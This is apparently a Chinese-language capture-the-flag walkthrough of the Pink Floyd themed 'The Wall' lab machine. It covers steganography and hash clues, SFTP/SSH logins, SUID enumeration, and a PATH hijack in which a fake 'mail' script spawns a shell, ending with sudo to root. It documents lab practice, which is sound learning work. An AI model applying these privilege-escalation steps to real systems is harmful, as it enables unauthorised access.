<p>在不知道該做甚麼的情況下只好再掃一次nmap，看看接收訊息後有沒有觸發甚麼開關</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# nmap -n -sT 192.168.0.116 -p-

Starting Nmap 6.49BETA4 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2015-12-19 18:15 CST
Nmap scan report <span class="k">for</span> 192.168.0.116
Host is up <span class="o">(</span>0.0048s latency<span class="o">)</span>.
Not shown: <span class="m">65534</span> filtered ports
PORT   STATE SERVICE
80/tcp open  http
1965/tcp open  unknown
MAC Address: AC:BC:32:80:89:77 <span class="o">(</span>Unknown<span class="o">)</span>

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 112.28 seconds</code></pre></div>


<p>有兩個port被打開了！</p>

<p>port 80有開，先用瀏覽器看一下</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-12-19-thewall-1/pink_floyd.png"></p>

<p>首頁只是一張Pink Floyd的合照，不過檢視原始碼之後會看到一段備註跟一串數字</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;!--If you want to find out what<span class="s1">&#39;s behind these cold eyes, you&#39;</span>ll just have to claw your way through this disguise. - Pink Floyd, The Wall

Did you know? The Publius Enigma is a mystery surrounding the Division Bell album.  Publius promised an unspecified reward <span class="k">for</span> solving the
riddle, and further claimed that there was an enigma hidden within the artwork.

737465673d3333313135373330646262623337306663626539373230666536333265633035--&gt;</code></pre></div>


<p>備註看起來是有密碼藏在圖片裡的意思</p>

<p>拿kali, stegano, password去google之後，會找到一個叫做steghide的工具</p>

<p>steghide可以將檔案藏入圖片中，並且設置密碼保護</p>

<p>備註的那串數字應該就是要用的密碼了</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# steghide extract -sf pink_floyd.jpg
Enter passphrase:
steghide: could not extract any data with that passphrase!</code></pre></div>


<p>結果不能直接輸入數字當密碼，只好把他轉成hex試試看</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# python -c <span class="s1">&#39;print &quot;737465673d3333313135373330646262623337306663626539373230666536333265633035&quot;.decode(&quot;hex&quot;);&#39;</span>
<span class="nv">steg</span><span class="o">=</span>33115730dbbb370fcbe9720fe632ec05</code></pre></div>


<p>轉出來的字串看起來有意義了，但是在拿後面那串16進位的字串當密碼還是失敗</p>

<p>最後看他符合md5的格式，就直接丟去google，馬上就得到答案：divisionbell</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-12-19-thewall-1/md5.png"></p>

<p>輸入密碼後就會解出一個txt檔，內容看起來又是要解另兩組編碼</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# steghide extract -sf pink_floyd.jpg
Enter passphrase:
wrote extracted data to <span class="s2">&quot;pink_floyd_syd.txt&quot;</span>.
root@kali:~/Security/wall# cat pink_floyd_syd.txt
Hey Syd,

I hear you<span class="err">&#39;</span>re full of dust and guitars?

If you want to See Emily Play, just use this key: <span class="nv">U3lkQmFycmV0dA</span><span class="o">==</span><span class="p">|</span>f831605ae34c2399d1e5bb3a4ab245d0

Roger

Did you know? In 1965, The Pink Floyd Sound changed their name to Pink Floyd.  The name was inspired
by Pink Anderson and Floyd Council, two blues muscians on the Piedmont Blues record Syd Barret had in
his collection.</code></pre></div>


<p>前半段用base64解碼後得到：SydBarrett</p>

<p>後半段再拿去google搜尋md5得到：pinkfloydrocks</p>

<p>解完這兩組key之後，也沒有後續的線索了</p>

<p>再來試一下剛剛namp掃到的port 1965，嘗試用ssh連線看看</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# nc 192.168.0.116 1965
SSH-2.0-OpenSSH_7.0</code></pre></div>


<p>拿剛剛得到的兩組字串當帳密去試試看</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# ssh SydBarrett@192.168.0.116 -p 1965
The authenticity of host <span class="s1">&#39;[192.168.0.116]:1965 ([192.168.0.116]:1965)&#39;</span> can<span class="s1">&#39;t be established.</span>
<span class="s1">ECDSA key fingerprint is 6c:2b:d1:2c:4f:1c:b5:7a:1b:1e:e9:4b:8e:9b:4b:5a.</span>
<span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
<span class="s1">Warning: Permanently added &#39;</span><span class="o">[</span>192.168.0.116<span class="o">]</span>:1965<span class="s1">&#39; (ECDSA) to the list of known hosts.</span>
<span class="s1">SydBarrett@192.168.0.116&#39;</span>s password:
Could not chdir to home directory /home/SydBarrett: No such file or directory
This service allows sftp connections only.
Connection to 192.168.0.116 closed.</code></pre></div>


<p>結果被系統打槍，只好照他說的用sftp登入，接著把裡面的東西通通抓回來研究</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# sftp -P1965 SydBarrett@192.168.0.116
SydBarrett@192.168.0.116<span class="err">&#39;</span>s password:
Connected to 192.168.0.116.
sftp&gt; sl
Invalid command.
sftp&gt; ls -al
drwxr-x---    <span class="m">3</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Oct <span class="m">24</span> 20:16 .
drwxr-x---    <span class="m">3</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Oct <span class="m">24</span> 20:16 ..
drwxr-xr-x    <span class="m">3</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Oct <span class="m">24</span> 18:17 .mail
-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">1000</span>         <span class="m">1912</span> Oct <span class="m">25</span> 22:56 bio.txt
-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">1000</span>       <span class="m">868967</span> Oct <span class="m">24</span> 16:17 syd_barrett_profile_pic.jpg
sftp&gt; get bio.txt
Fetching /bio.txt to bio.txt
/bio.txt                                                                100% <span class="m">1912</span>     1.9KB/s   00:00
sftp&gt; get syd_barrett_profile_pic.jpg
Fetching /syd_barrett_profile_pic.jpg to syd_barrett_profile_pic.jpg
/syd_barrett_profile_pic.jpg                                            100%  849KB 848.6KB/s   00:00
sftp&gt; <span class="nb">cd</span> .mail
sftp&gt; ls
sent-items
sftp&gt; ls -al
drwxr-xr-x    <span class="m">3</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Oct <span class="m">24</span> 18:17 .
drwxr-x---    <span class="m">3</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Oct <span class="m">24</span> 20:16 ..
drwxr-xr-x    <span class="m">2</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Nov <span class="m">11</span> 10:25 .stash
-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">309</span> Oct <span class="m">24</span> 18:18 sent-items
sftp&gt; get sent-items
Fetching /.mail/sent-items to sent-items
/.mail/sent-items                                                       100%  <span class="m">309</span>     0.3KB/s   00:00
sftp&gt; <span class="nb">cd</span> .
../      ./       .stash/
sftp&gt; <span class="nb">cd</span> .stash/
sftp&gt; ls
eclipsed_by_the_moon
sftp&gt; ls -al
drwxr-xr-x    <span class="m">2</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Nov <span class="m">11</span> 10:25 .
drwxr-xr-x    <span class="m">3</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Oct <span class="m">24</span> 18:17 ..
-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">1000</span>     <span class="m">48884479</span> Aug  <span class="m">7</span> 14:33 eclipsed_by_the_moon
sftp&gt; get eclipsed_by_the_moon
Fetching /.mail/.stash/eclipsed_by_the_moon to eclipsed_by_the_moon
/.mail/.stash/eclipsed_by_the_moon                                      100%   47MB   5.8MB/s   00:00
sftp&gt;</code></pre></div>


<p>看來看去最可疑的是sent-items的內容和eclipsed_by_the_moon</p>

<p>說找到後用scalpel處理??</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# cat sent-items
Date: Sun, <span class="m">24</span> Oct <span class="m">1965</span> 18:45:21 +0200
From: Syd Barrett &lt;syd@pink.floyd&gt;
Reply-To: Syd Barret &lt;syd@pink.floyd&gt;
To: Roger Waters &lt;roger@pink.floyd&gt;
Subject: Had to hide the stash

Roger... I had to hide the stash.

Usual deal.. just use the scalpel when you find it.

Ok, sorry <span class="k">for</span> that.

Rock on man

<span class="s2">&quot;Syd&quot;</span></code></pre></div>


<p>檢查eclipsed_by_the_moon之後會發現他其實是個gz檔</p>

<p>解壓縮後會得到一個用tar壓縮的檔案，再換tar解壓縮一次</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall/ec# file eclipsed_by_the_moon.lsd
eclipsed_by_the_moon.lsd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID <span class="s2">&quot;MSDOS5.0&quot;</span>, sectors/cluster 2, reserved sectors 8, root entries 512, Media descriptor 0xf8, sectors/FAT 188, sectors/track 63, heads 255, hidden sectors 2048, sectors <span class="m">96256</span> <span class="o">(</span>volumes &gt; <span class="m">32</span> MB<span class="o">)</span> , serial number 0x9e322180, unlabeled, FAT <span class="o">(</span><span class="m">16</span> bit<span class="o">)</span></code></pre></div>


<p>最後得到一個lsd檔</p>

<p>研究一下scalpel的用法之後，到/etc/scalpel/scalpel.conf把想要搜尋的檔案類型打開</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# scalpel eclipsed_by_the_moon.lsd
Scalpel version 1.60
Written by Golden G. Richard III, based on Foremost 0.69.

Opening target <span class="s2">&quot;/root/Security/wall/eclipsed_by_the_moon.lsd&quot;</span>

Image file pass 1/2.
eclipsed_by_the_moon.lsd: 100.0% <span class="p">|</span>*****************************************************<span class="p">|</span>   47.0 MB    00:00 ETAAllocating work queues...
Work queues allocation complete. Building carve lists...
Carve lists built.  Workload:
jpg with header <span class="s2">&quot;\xff\xd8\xff\xe0\x00\x10&quot;</span> and footer <span class="s2">&quot;\xff\xd9&quot;</span> --&gt; <span class="m">1</span> files
Carving files from image.
Image file pass 2/2.
eclipsed_by_the_moon.lsd: 100.0% <span class="p">|</span>*****************************************************<span class="p">|</span>   47.0 MB    00:00 ETAProcessing of image file complete. Cleaning up...
Done.
Scalpel is <span class="k">done</span>, files <span class="nv">carved</span> <span class="o">=</span> 1, <span class="nv">elapsed</span> <span class="o">=</span> <span class="m">0</span> seconds.</code></pre></div>


<p><img class="center" src="http://newdominic.github.io/images/2015-12-19-thewall-1/roger_waters.png"></p>

<p>拿到了Roger Waters的密碼，再用他的帳號登入ssh看看</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall/roger_waters# ssh RogerWaters@192.168.0.116 -p1965
RogerWaters@192.168.0.116<span class="s1">&#39;s password:</span>
<span class="s1">Permission denied, please try again.</span>
<span class="s1">RogerWaters@192.168.0.116&#39;</span>s password:
Permission denied, please try again.
RogerWaters@192.168.0.116<span class="s1">&#39;s password:</span>
<span class="s1">OpenBSD 5.8 (GENERIC) #1066: Sun Aug 16 02:33:00 MDT 2015</span>

<span class="s1">                       .u!&quot;`</span>
<span class="s1">                   .x*&quot;`</span>
<span class="s1">               ..+&quot;NP</span>
<span class="s1">            .z&quot;&quot;   ?</span>
<span class="s1">          M#`      9     ,     ,</span>
<span class="s1">                   9 M  d! ,8P&#39;</span>
                   R X.:x<span class="s1">&#39; R&#39;</span>  ,
                   F F<span class="s1">&#39; M  R.d&#39;</span>
                   d P  @  E<span class="sb">`</span>  ,
      ss           P  <span class="s1">&#39;  P  N.d&#39;</span>
       x         <span class="s1">&#39;&#39;</span>        <span class="s1">&#39;</span>
<span class="s1">       X               x             .</span>
<span class="s1">       9     .f       !         .    $b</span>
<span class="s1">       4;    $k      /         dH    $f</span>
<span class="s1">       &#39;</span>X   <span class="p">;</span><span class="nv">$$</span>     z  .       MR   :<span class="err">$</span>
        R   M<span class="nv">$$</span>,   :  d9b      M<span class="s1">&#39;   tM</span>
<span class="s1">        M:  #&#39;</span><span class="nv">$L</span>  <span class="p">;</span><span class="s1">&#39; M `8      X    MR</span>
<span class="s1">        `$;t&#39;</span> <span class="nv">$F</span>  <span class="c"># X ,oR      t    Q;</span>
         <span class="nv">$$</span>@  R<span class="nv">$ </span>H :RP<span class="s1">&#39; $b     X    @&#39;</span>
         9<span class="nv">$E</span>  @Bd<span class="s1">&#39; $&#39;</span>   ?X     <span class="p">;</span>    W
         <span class="sb">`</span>M<span class="s1">&#39;  `$M d$    `E    ;.o* :R   ..</span>
<span class="s1">          `    &#39;</span>  <span class="s2">&quot;&#39;     &#39;    @&#39;   &#39;$o*&quot;</span><span class="err">&#39;</span>
<span class="nv">$ </span>uname -a
OpenBSD thewall.localdomain 5.8 GENERIC#1066 i386
<span class="nv">$ </span>id
<span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>RogerWaters<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>RogerWaters<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>RogerWaters<span class="o">)</span></code></pre></div>


<p>終於成功拿到shell了，接下來要找提權的方法</p>

<p>研究一下之後發現系統上有五個使用者，目前已經拿到兩個使用者的權限，推測大概要把五個都走完</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>cat /etc/passwd
...
SydBarrett:*:1000:1000:Syd Barrett:/home/SydBarrett:/sbin/nologin
NickMason:*:1001:1001:Nick Mason:/home/NickMason:/bin/ksh
RogerWaters:*:1002:1002:Roger Waters:/home/RogerWaters:/bin/ksh
RichardWright:*:1003:1003:Richard Wright:/home/RichardWright:/bin/ksh
DavidGilmour:*:1004:1004:David Gilmour:/home/DavidGilmour:/bin/ksh</code></pre></div>


<p>接著找看看系統上特別設定stick bit的檔案</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span><span class="k">for</span> i in <span class="k">$(</span>find / -perm -4000 2&gt;/dev/null<span class="k">)</span><span class="p">;</span> <span class="k">do</span> ls -al <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
...
-rws--s--x  <span class="m">1</span> NickMason  NickMason  <span class="m">7291</span> Aug  <span class="m">8</span> 00:33 /usr/local/bin/brick
-rwsr-s---  <span class="m">1</span> DavidGilmour  RichardWright  <span class="m">7524</span> Oct <span class="m">25</span> 07:58 /usr/local/bin/shineon</code></pre></div>


<p>找到了兩個檔案，不過可以執行的只有/usr/local/bin/brick</p>

<p>執行之後回答問題就能拿到NickMason的權限</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>/usr/local/bin/brick
...
Who is the only band member to be featured on every Pink Floyd album? : Nick Mason
/bin/sh: Cannot determine current working directory
<span class="nv">$ </span>id
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>NickMason<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>NickMason<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>RogerWaters<span class="o">)</span></code></pre></div>


<p>在NickMason的家目錄底下逛不到甚麼結果，就把nick_mason_profile_pic.jpg傳回攻擊端</p>

<p>本來以為是張圖片，結果定睛一看是個ogg檔</p>

<p>播放之後，會聽到一段夾雜著應該是摩斯密碼的旋律</p>

<p>可以直接用聽的方式來解，不過為了避免浪費時間，還是丟到Sonic Visualizer讓他圖型化比較保險XD</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-12-19-thewall-1/morse_code.png"></p>

<p>最後得到 richardwright1943farfisa</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>su RichardWright
Password:
ksh: Cannot determine current working directory
<span class="nv">$ </span>id
<span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span>
<span class="err">$</span></code></pre></div>


<p>接著以RichardWright的權限執行/usr/local/bin/shineon</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>/usr/local/bin/shineon
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit</code></pre></div>


<p>測試過後發現都是執行linux內建的程式</p>

<p>稍微用strings檢查一下/usr/local/bin/shineon</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>strings /usr/local/bin/shineon
...
Time - The Dark Side of the Moon
/usr/bin/cal
Press ENTER to <span class="k">continue</span>.
Echoes - Meddle
/usr/bin/who
Is There Anybody Out There? - The Wall
/sbin/ping -c <span class="m">3</span> www.google.com
Keep Talking- The Division Bell
mail</code></pre></div>


<p>看來除了mail以外，其他都是用絕對路徑執行程式，推測這邊可以修改PATH來達到SUID的效果</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
/home/RogerWaters/bin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/X11R6/bin:/usr/local/bin:/usr/local/sbin:/usr/games:.</code></pre></div>


<p>這邊看到/home/RogerWaters/bin已經排在$PATH的最前面了</p>

<p>再來就是切回RogerWaters的帳號，在bin的目錄建立一個假的mail</p>

<p>不過因為RogerWaters的家目錄不是公開的，還要另外開放權限才能讓其他帳號使用</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>mkdir bin
<span class="nv">$ </span><span class="nb">cd </span>bin
<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;#!/usr/local/bin/python&#39;</span> &gt; mail
<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;import pty&#39;</span> &gt;&gt; mail
<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;pty.spawn(&quot;/bin/sh&quot;)&#39;</span> &gt;&gt; mail
<span class="nv">$ </span>chmod +x mail</code></pre></div>


<p>設定完就切回RichardWright，再執行一次/usr/local/bin/shineon，就拿到DavidGilmour的群組權限了</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>/usr/local/bin/shineon
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
4
Keep Talking- The Division Bell
/bin/sh: Cannot determine current working directory
<span class="nv">$ </span>id
<span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span>
<span class="err">$</span></code></pre></div>


<p>在DavidGilmour的家目錄下發現一個anotherbrick.txt，裡面提供了一串網址</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>cat anotherbrick.txt
<span class="c"># Come on you raver, you seer of visions, come on you painter, you piper, you prisoner, and shine. - Pink Floyd, Shine On You Crazy Diamond</span>

New website <span class="k">for</span> review:    pinkfloyd1965newblogsite50yearscelebration-temp/index.php

<span class="c"># You have to be trusted by the people you lie to. So that when they turn their backs on you, you&#39;ll get the chance to put the knife in. - Pink Floyd, Dogs</span>
<span class="err">$</span></code></pre></div>


<p>連上網頁後，在程式碼最後有一行註解</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;!--Through the window in the wall, come streaming in on sunlight wings, a million bright ambassadors of morning. - Pink Floyd, Echoes
Can you see what the Dog sees? Perhaps hints of lightness streaming in on sunlight wings?--&gt;</code></pre></div>


<p><img class="center" src="http://newdominic.github.io/images/2015-12-19-thewall-1/dog.png"></p>

<p>這隻狗下面貌似有兩排字，調整亮度跟對比後會得到</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">/welcometothemachine
50696e6b466c6f796435305965617273</code></pre></div>


<p>50696e6b466c6f796435305965617273用hex解碼後會得到PinkFloyd50Years</p>

<p>而將/welcometothemachine輸入網址列後會得到403 Forbidden的結果</p>

<p>實際到/var/www目錄後，看到htdocs的群組權限是指定給welcometothemachine</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>id
<span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span>
<span class="nv">$ </span>cat /etc/group
welcometothemachine:*:1005:DavidGilmour</code></pre></div>


<p>在這邊卡了十分鐘之後，只好認命回家目錄再找找有沒有其他線索</p>

<p>最後在david_gilmour_profile_pic.jpg找到了一個字串</p>

<p>拿這當的密碼就能登入DavidGilmour的帳號了orz</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>strings david_gilmour_profile_pic.jpg
who_are_you_and_who_am_i
<span class="nv">$ </span>su DavidGilmour
Password:
<span class="nv">$ </span>id
<span class="nv">uid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span>, 1<span class="o">(</span>daemon<span class="o">)</span>, 67<span class="o">(</span>www<span class="o">)</span>, 1005<span class="o">(</span>welcometothemachine<span class="o">)</span></code></pre></div>


<p>再回到剛剛的/var/www/htdocs，最後找到PinkFloyd這個執行檔</p>

<p>本來以為解碼過的字串是正確答案，結果原句輸入就得到了新的權限了orz</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>./PinkFloyd
Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
Answer: PinkFloyd50Years

Denied....
If I had my way, I<span class="err">&#39;</span>d have all of ya shot. - Pink Floyd, In The Flesh
<span class="nv">$ </span>./PinkFloyd
Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
Answer: 50696e6b466c6f796435305965617273

Fearlessly the idiot faced the crowd smiling. - Pink Floyd, Fearless

Congratulations... permission has been granted.
You can now <span class="nb">set </span>your controls to the heart of the sun!
<span class="nv">$ </span>id
<span class="nv">uid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span>, 1<span class="o">(</span>daemon<span class="o">)</span>, 67<span class="o">(</span>www<span class="o">)</span>, 1005<span class="o">(</span>welcometothemachine<span class="o">)</span></code></pre></div>


<p>只是拿到daemon和www的權限之後有點無所適從，最後才發現其實是拿到了sudo的權限</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>sudo -l
Password:
Matching Defaults entries <span class="k">for</span> DavidGilmour on thewall:
    env_keep+<span class="o">=</span><span class="s2">&quot;FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK&quot;</span>

User DavidGilmour may run the following commands on thewall:
    <span class="o">(</span>ALL<span class="o">)</span> SETENV: ALL
    <span class="o">(</span>ALL<span class="o">)</span> SETENV: ALL

<span class="nv">$ </span>sudo su
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span>, 2<span class="o">(</span>kmem<span class="o">)</span>, 3<span class="o">(</span>sys<span class="o">)</span>, 4<span class="o">(</span>tty<span class="o">)</span>, 5<span class="o">(</span>operator<span class="o">)</span>, 20<span class="o">(</span>staff<span class="o">)</span>, 31<span class="o">(</span>guest<span class="o">)</span>
<span class="c"># cat /root/flag.txt</span>

<span class="s2">&quot;The band is fantastic, that is really what I think. Oh, by the way, which one is Pink? - Pink Floyd, Have A Cigar&quot;</span>

                   Congratulations on rooting thewall!

   ___________________________________________________________________
  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span> <span class="p">|</span>
  <span class="p">|</span>_<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>______ <span class="s1">&#39;__  ___|_______|_______|_______|_______|_|</span>
<span class="s1">  |     |       |       |   |  )      /         |       |       |     |</span>
<span class="s1">  |_____|_______|_______|__ |,&#39;</span> , .  <span class="p">|</span> <span class="p">|</span> _ , ___<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_____<span class="p">|</span>
  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>      ,<span class="p">|</span>   <span class="p">|</span> <span class="p">|</span><span class="se">\ </span><span class="p">|</span> <span class="p">|</span> ,<span class="s1">&#39; |       |       |       | |</span>
<span class="s1">  |_|_______|_______|____ &#39;</span> <span class="p">|</span> _ <span class="p">|</span> <span class="p">|</span> <span class="se">\|</span> <span class="p">|</span><span class="s1">&#39;\ _|_______|_______|_______|_|</span>
<span class="s1">  |     |       |       |   \  _&#39;</span> <span class="s1">&#39;  ` |  \     |       |       |     |</span>
<span class="s1">  |_____|_______|_______|_  ,-&#39;</span>_ _____ <span class="p">|</span> _______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_____<span class="p">|</span>
  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>   ,-<span class="s1">&#39;|  _     |       |       |       |       | |</span>
<span class="s1">  |_|_______|_______|__  ,-|-&#39;</span> <span class="p">|</span>  ,-. <span class="se">\ </span>/_.--. _____<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_<span class="p">|</span>
  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>          <span class="p">|</span>   <span class="p">|</span>  <span class="p">|</span> <span class="p">|</span>  V  <span class="p">|</span>   <span class="o">)</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>     <span class="p">|</span>
  <span class="p">|</span>_____<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_ <span class="p">|</span> _ <span class="p">|</span>-<span class="s1">&#39;`-&#39;</span>  <span class="p">|</span>  <span class="p">|</span> ,<span class="s1">&#39; _|_______|_______|_____|</span>
<span class="s1">  | |       |       |      |        |  &#39;</span>  <span class="p">;</span><span class="s1">&#39;        |       |       | |</span>
<span class="s1">  |_|_______|_______|______&quot;|_____  _,- o&#39;</span>__<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_<span class="p">|</span>
  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       _,-<span class="s1">&#39;    .       |       |       |     |</span>
<span class="s1">  |_____|_______|_______|_ _,--&#39;</span><span class="se">\ </span>     _,-<span class="s1">&#39;_____|_______|_______|_____|</span>
<span class="s1">  | |       |       |     &#39;</span>     <span class="o">||</span>_<span class="o">||</span>-<span class="s1">&#39; _   |       |       |       | |</span>
<span class="s1">  |_|_______|_______|_______|__ || ||,-&#39;</span>  __<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_<span class="p">|</span>
  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>  <span class="o">||</span>_,-<span class="s1">&#39;       |       |       |     |</span>
<span class="s1">  |_____|_______|______.|_______.__  ___|_______|_______|_______|_____|</span>
<span class="s1">  | |       |       |   \    |     /        |       |       |       | |</span>
<span class="s1">  |_|_______|_______|___ \ __|___ /,  _ |   | ______|_______|_______|_|</span>
<span class="s1">  |     |       |       | \      // \   |   |   |       |       |     |</span>
<span class="s1">  |_____|_______|_______|_ \ /\ //--&#39;</span><span class="se">\ </span> <span class="p">|</span>   <span class="p">|</span> __<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_____<span class="p">|</span>
  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="s1">&#39;  V/    |  |-&#39;</span> <span class="p">|</span>__,    <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span> <span class="p">|</span>
  <span class="p">|</span>_<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______ _______<span class="err">&#39;</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_<span class="p">|</span>
  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>     <span class="p">|</span>
  <span class="p">|</span>_____<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_____<span class="p">|</span>
